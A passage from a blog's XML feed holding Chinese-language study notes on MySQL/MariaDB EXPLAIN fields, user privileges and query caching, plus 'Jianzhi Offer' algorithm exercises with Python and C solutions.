class="line">key_len：在索引中使用的字节数</span><br><span class="line">ref：在利用key字段所表示的索引完成查询时所用的列或常量值</span><br><span class="line">rows：mysql为找到所有目标而读取的行数</span><br><span class="line">extra：额外信息</span><br><span class="line">Using index：mysql使用覆盖索引，以避免访问表</span><br><span class="line">Using where：mysql将在存储引擎层检索后再进行过滤，即过滤where条件</span><br><span class="line">Using temporary：mysql对结果排序时会使用临时表</span><br><span class="line">Using filesort：mysql对结果使用外部索引排序</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;基本法则&quot;&gt;&lt;a href=&quot;#基本法则&quot; class=&quot;headerlink&quot; title=&quot;基本法则&quot;&gt;&lt;/a&gt;基本法则&lt;/h3&gt;&lt;p&gt;索引应该被构建在经常被用作查询条件的字段上。&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-用户权限、缓存</title>
    <link href="http://yoursite.com/2020/02/22/mariadb-%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E3%80%81%E7%BC%93%E5%AD%98/"/>
    <id>http://yoursite.com/2020/02/22/mariadb-%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E3%80%81%E7%BC%93%E5%AD%98/</id>
    <published>2020-02-22T06:12:02.000Z</published>
    <updated>2020-02-22T11:21:59.060Z</updated>
    
    <content type="html"><![CDATA[<h3 id="权限类别"><a href="#权限类别" class="headerlink" title="权限类别"></a>权限类别</h3><p>mysql数据库的权限主要分为库、表、字段、管理、程序等类别。</p><a id="more"></a><h4 id="管理类"><a href="#管理类" class="headerlink" title="管理类"></a>管理类</h4><ul><li>create temporary tables：创建临时表，一般为16mb，存储在内存中</li><li>create user：创建用户</li><li>file：将当前数据库保存到文件中，或者从文件中导入数据库</li><li>super：高级管理类权限，如授权等</li><li>show databases：查看数据库，一般所有用户都有</li><li>reload：重新装载授权表</li><li>shutdown：进程级别关闭数据库</li><li>replication slave：是否能够实现复制功能</li><li>replication client：是否能向主服务器请求复制</li><li>lock tables：锁表</li><li>process：与mysql进程相关</li></ul><h4 id="程序类"><a href="#程序类" class="headerlink" title="程序类"></a>程序类</h4><ul><li>function：创建、修改、删除、执行函数</li><li>procedure：创建、修改、删除、执行函数</li><li>trigger：创建、修改、删除、执行触发器</li></ul><h4 id="库和表类"><a href="#库和表类" class="headerlink" title="库和表类"></a>库和表类</h4><ul><li>alter：修改</li><li>create：创建</li><li>create view：创建视图</li><li>drop：删除</li><li>index：创建或删除索引</li><li>show view：查看视图</li><li>grant option：能把自己获得权限赠给其他用户一个副本</li></ul><h4 id="数据字段类"><a href="#数据字段类" class="headerlink" title="数据字段类"></a>数据字段类</h4><ul><li>select：查询字段</li><li>insert：修改字段</li><li>delete：删除字段</li><li>update：更新字段</li></ul><h4 id="所有权限类"><a href="#所有权限类" class="headerlink" title="所有权限类"></a>所有权限类</h4><ul><li>all privileges：表示所有有限权限</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#以上信息都存放在mysql元数据表中</span><br><span class="line">use mysql;</span><br><span class="line">show tabels;</span><br><span class="line"></span><br><span class="line">db、host、user：用于实现用户授权，即用户登录等限制信息</span><br><span class="line">columns_priv, tables_priv, procs_priv, proxies_priv：表、程序、代理级别的权限</span><br></pre></td></tr></table></figure><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><h4 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;username&#39;@&#39;host&#39; [identified by &#39;password&#39;];</span><br><span class="line">username：用户名</span><br><span class="line">host：允许用户登录的网段，可使用%通配</span><br><span class="line">password：用户密码</span><br></pre></td></tr></table></figure><h4 id="查看用户授权"><a href="#查看用户授权" class="headerlink" title="查看用户授权"></a>查看用户授权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show grants for &#39;username&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><h4 id="重命名用户"><a href="#重命名用户" class="headerlink" title="重命名用户"></a>重命名用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename user old_user_name to new_user_name;</span><br></pre></td></tr></table></figure><h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop user &#39;username&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><h4 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#第一种</span><br><span class="line">set password for</span><br><span class="line">#第二种，不自动更新授权表，需要执行flush privileges</span><br><span class="line">update mysql.user set password&#x3D;PASSWORD(&#39;your_password&#39;) where clause;</span><br><span class="line">#第三种</span><br><span class="line">mysqladm password</span><br></pre></td></tr></table></figure><h4 id="忘记管理员密码"><a href="#忘记管理员密码" class="headerlink" title="忘记管理员密码"></a>忘记管理员密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、启动mysqld进程时，使用--skip-grant-tables --skip-networking来跳过授权以及网络连接，centos7需要修改对应service文件</span><br><span class="line">2、使用update命令修改管理员密码</span><br><span class="line">3、重启mysqld进程</span><br></pre></td></tr></table></figure><h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GRANT priv_type[,...] ON [&#123;table|function|procedure&#125;] db.&#123;table|routine&#125; TO &#39;USERNAME&#39;@&#39;HOST&#39; [IDENTIFIED BY &#39;password&#39;] [REQUIRE SSL] [WITH with_option]</span><br><span class="line">with_option：</span><br><span class="line">MAX_QUERIES_PER_HOUR count：每小时最多查询数</span><br><span class="line">MAX_UPDATES_PER_HOUR count：每小时最多更新数</span><br><span class="line">MAX_CONNECTIONS_PER_HOUR count：每小时最大连接数</span><br><span class="line">MAX_USER_CONNECTIONS count：每个用户最大连接数</span><br></pre></td></tr></table></figure><h4 id="取消授权"><a href="#取消授权" class="headerlink" title="取消授权"></a>取消授权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REVOKE priv_type [(column_list)] [,priv_type [(column_list)]] ... ON [object_type] priv_level FROM user [,user]...</span><br></pre></td></tr></table></figure><h3 id="查询缓存"><a href="#查询缓存" class="headerlink" title="查询缓存"></a>查询缓存</h3><h4 id="判断是否命中"><a href="#判断是否命中" class="headerlink" title="判断是否命中"></a>判断是否命中</h4><p>通过查询语句的hash值判断，需要考虑几个因素：</p><ul><li>查询语句本身，查询语句任何字符上的不同都会导致缓存不能命中；若查询语句中包含用户自定义函数、存储函数、用户自定义变量、临时表、mysql系统表、列级权限表、不确定值的函数等都不会被缓存</li><li>要查询的数据库</li><li>客户端使用的协议版本</li></ul><h4 id="缓存效率"><a href="#缓存效率" class="headerlink" title="缓存效率"></a>缓存效率</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#查看mysql查询缓存相关变量</span><br><span class="line">show global variables like &#39;%query%&#39;</span><br><span class="line">#查询相关缓存状态变量</span><br><span class="line">show global status like &#39;Qcache%&#39;</span><br><span class="line"></span><br><span class="line">#命中率</span><br><span class="line">Qcache_hits&#x2F;(Qcache_hits+Com_select)</span><br><span class="line"></span><br><span class="line">#有关变量</span><br><span class="line">query_cache_min_res_unit：查询缓存的内存分配最小单位；值减少会减少浪费，但会导致更频繁的内存分配；值较大时会导致碎片过多，可以使用FLUSH QUERY CACHE来减少碎片</span><br><span class="line">query_cache_limit：mysql能够缓存的最大查询结果；对于有着较大结果的查询语句，建议在select中使用SQL_NO_CACHE来显示指定不缓存</span><br><span class="line">query_cache_size：查询缓存可用的内存空间，必须是1024整数倍，单位为字节</span><br><span class="line">query_cache_type：缓存类型，ON、OFF、DEMAND，DEMAND表示只有查询语句显示指定SQL_CACHE时才缓存</span><br><span class="line">query_cache_wlock_invalidate：如果某表被其他连接锁定，是否仍从查询返回结果，默认为OFF</span><br><span class="line"></span><br><span class="line">#常见问题及修改</span><br><span class="line">查询结果过大导致不能缓存，需要提高query_cache_limit值</span><br><span class="line">内存碎片化，需要减少query_cache_min_res_unit值</span><br><span class="line">如果缓存空间太小，导致缓存不断换入换出，需要提高query_cache_size值</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;权限类别&quot;&gt;&lt;a href=&quot;#权限类别&quot; class=&quot;headerlink&quot; title=&quot;权限类别&quot;&gt;&lt;/a&gt;权限类别&lt;/h3&gt;&lt;p&gt;mysql数据库的权限主要分为库、表、字段、管理、程序等类别。&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
  </entry>
  
  <entry>
    <title>10矩阵中的路径</title>
    <link href="http://yoursite.com/2020/02/19/10%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84/"/>
    <id>http://yoursite.com/2020/02/19/10%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84/</id>
    <published>2020-02-19T11:27:38.000Z</published>
    <updated>2020-02-19T11:30:20.198Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一格开始，每一步可以在矩阵中向左、右、上、下移动一格。如果一条路径经过了矩阵的某一格，那么该路径不能再次进入该格子。例如，在下面的3×4的矩阵中包含一条字符串“bfce”的路径（路径中的字母用加粗标出）。</p><a id="more"></a><p>[ [ “a”,”<strong>b</strong>“,”c”,”e” ],<br>[ “s”,”<strong>f</strong>“,”<strong>c</strong>“,”s” ],<br>[ “a”,”d”,”<strong>e</strong>“,”e” ] ]</p><p>但矩阵中不包含字符串“abfb”的路径，因为字符串的第一个字符b占据了矩阵中的第一行第二个格子之后，路径不能再次进入这个格子。</p><p><strong>示例 1：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：board &#x3D; [[&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;E&quot;],[&quot;S&quot;,&quot;F&quot;,&quot;C&quot;,&quot;S&quot;],[&quot;A&quot;,&quot;D&quot;,&quot;E&quot;,&quot;E&quot;]], word &#x3D; &quot;ABCCED&quot;</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：board &#x3D; [[&quot;a&quot;,&quot;b&quot;],[&quot;c&quot;,&quot;d&quot;]], word &#x3D; &quot;abcd&quot;</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= board.length &lt;= 200</code></li><li><code>1 &lt;= board[i].length &lt;= 200</code></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exist</span><span class="params">(self, board, word)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type board: List[List[str]]</span></span><br><span class="line"><span class="string">        :type word: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(board)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(board[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span> self.backtrace(board, word, <span class="number">0</span>, i, j):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backtrace</span><span class="params">(self, board, word, index, i, j)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> board[i][j] != word[index]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> index + <span class="number">1</span> == len(word):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        tmp = board[i][j]</span><br><span class="line">        board[i][j] = <span class="number">0</span></span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> self.backtrace(board, word, index, i - <span class="number">1</span>, j) <span class="keyword">or</span> \</span><br><span class="line">                j &gt; <span class="number">0</span> <span class="keyword">and</span> self.backtrace(board, word, index, i, j - <span class="number">1</span>) <span class="keyword">or</span> \</span><br><span class="line">                i &lt; len(board) - <span class="number">1</span> <span class="keyword">and</span> self.backtrace(board, word, index, i + <span class="number">1</span>, j) <span class="keyword">or</span> \</span><br><span class="line">                j &lt; len(board[<span class="number">0</span>]) - <span class="number">1</span> <span class="keyword">and</span> self.backtrace(board, word, index, i, j + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        board[i][j] = tmp</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//主要思路是回溯，从第一位开始匹配，需要记录待匹配的字符串的下标用于比较是否匹配结束</span></span><br><span class="line"><span class="comment">//进入回溯后判断当前待匹配下标和矩阵的值是否相等，相等就继续上下左右回溯(注意区间)</span></span><br><span class="line"><span class="comment">//上下左右均未找到则恢复矩阵</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">backtrack</span><span class="params">(<span class="keyword">char</span>** board, <span class="keyword">int</span> boardSize, <span class="keyword">int</span>* boardColSize, <span class="keyword">char</span>* <span class="keyword">word</span>, <span class="keyword">int</span> index, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (board[i][j] != <span class="keyword">word</span>[index])<span class="comment">//当前字母不相等</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (index + <span class="number">1</span> == <span class="built_in">strlen</span>(<span class="keyword">word</span>))<span class="comment">//最后一个字母相等，路径正确</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">char</span> tmp = board[i][j];<span class="comment">//暂存当前</span></span><br><span class="line">board[i][j] = <span class="number">0</span>;<span class="comment">//避免重复使用</span></span><br><span class="line">index++;</span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">(i &gt; <span class="number">0</span> &amp;&amp; backtrack(board, boardSize, boardColSize, <span class="keyword">word</span>, index, i - <span class="number">1</span>, j))</span><br><span class="line">|| (j &gt; <span class="number">0</span> &amp;&amp; backtrack(board, boardSize, boardColSize, <span class="keyword">word</span>, index, i, j - <span class="number">1</span>))</span><br><span class="line">|| (i &lt; boardSize - <span class="number">1</span> &amp;&amp; backtrack(board, boardSize, boardColSize, <span class="keyword">word</span>, index, i + <span class="number">1</span>, j))</span><br><span class="line">|| (j &lt; *boardColSize - <span class="number">1</span> &amp;&amp; backtrack(board, boardSize, boardColSize, <span class="keyword">word</span>, index, i, j + <span class="number">1</span>))</span><br><span class="line">)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">board[i][j] = tmp;<span class="comment">//没找到，进行恢复</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">exist</span><span class="params">(<span class="keyword">char</span>** board, <span class="keyword">int</span> boardSize, <span class="keyword">int</span>* boardColSize, <span class="keyword">char</span>* <span class="keyword">word</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; boardSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; *boardColSize; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (backtrack(board, boardSize, boardColSize, <span class="keyword">word</span>, <span class="number">0</span>, i, j))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一格开始，每一步可以在矩阵中向左、右、上、下移动一格。如果一条路径经过了矩阵的某一格，那么该路径不能再次进入该格子。例如，在下面的3×4的矩阵中包含一条字符串“bfce”的路径（路径中的字母用加粗标出）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>09旋转数组的最小数字</title>
    <link href="http://yoursite.com/2020/02/19/09%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97/"/>
    <id>http://yoursite.com/2020/02/19/09%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97/</id>
    <published>2020-02-19T11:24:33.000Z</published>
    <updated>2020-02-19T11:30:15.693Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。输入一个递增排序的数组的一个旋转，输出旋转数组的最小元素。例如，数组 [3,4,5,1,2] 为 [1,2,3,4,5] 的一个旋转，该数组的最小值为1。  </p><a id="more"></a><p><strong>示例 1：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[3,4,5,1,2]</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2,2,2,0,1]</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minArray</span><span class="params">(self, numbers)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type numbers: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        low=<span class="number">0</span></span><br><span class="line">        high=len(numbers)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> low&lt;high:</span><br><span class="line">            mid=(low+high)/<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> numbers[mid] &lt; numbers[high]:</span><br><span class="line">                high=mid</span><br><span class="line">            <span class="keyword">elif</span> numbers[mid] &gt; numbers[high]:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> numbers[low]</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//若中间的数比最后一个数大，最小值在右边</span></span><br><span class="line"><span class="comment">//若中间的数比最后一个数小，最小值在左边</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minArray</span><span class="params">(<span class="keyword">int</span>* numbers, <span class="keyword">int</span> numbersSize)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> low = <span class="number">0</span>, high = numbersSize - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (low &lt; high)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> mid = (high + low) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (numbers[mid]&lt;numbers[high])</span><br><span class="line">&#123;</span><br><span class="line">high = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (numbers[mid]&gt;numbers[high])</span><br><span class="line">&#123;</span><br><span class="line">low = mid + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">high--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> numbers[low];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。输入一个递增排序的数组的一个旋转，输出旋转数组的最小元素。例如，数组 [3,4,5,1,2] 为 [1,2,3,4,5] 的一个旋转，该数组的最小值为1。  &lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>08青蛙跳台阶</title>
    <link href="http://yoursite.com/2020/02/19/08%E9%9D%92%E8%9B%99%E8%B7%B3%E5%8F%B0%E9%98%B6/"/>
    <id>http://yoursite.com/2020/02/19/08%E9%9D%92%E8%9B%99%E8%B7%B3%E5%8F%B0%E9%98%B6/</id>
    <published>2020-02-19T11:22:56.000Z</published>
    <updated>2020-02-19T11:30:12.370Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级台阶。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。</p><p>答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。</p><a id="more"></a><p><strong>示例 1：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 2</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 7</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>0 &lt;= n &lt;= 100</code></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#同斐波拉契一样</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numWays</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        a=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,n+<span class="number">1</span>):</span><br><span class="line">            a.append((a[i<span class="number">-1</span>]+a[i<span class="number">-2</span>])%<span class="number">1000000007</span>)</span><br><span class="line">        <span class="keyword">return</span> a[n]</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 